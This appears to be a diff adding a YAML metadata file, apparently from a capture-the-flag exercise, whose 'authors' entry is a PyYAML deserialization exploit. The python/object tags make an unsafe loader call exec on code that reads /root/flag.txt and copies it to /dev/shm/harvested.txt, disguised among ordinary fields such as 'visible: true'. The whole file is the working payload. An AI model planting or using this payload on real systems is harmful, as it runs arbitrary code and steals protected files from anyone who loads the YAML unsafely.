@@ -1,0 +1,10 @@
+authors:
+  - !!python/object/new:str
+    args: []
+    state: !!python/tuple
+    - "x=open('/root/flag.txt','r').read();y=open('/dev/shm/harvested.txt','w').write(x)"
+    - !!python/object/new:staticmethod
+      args: [0]
+      state:
+        update: !!python/name:exec
+visible: true
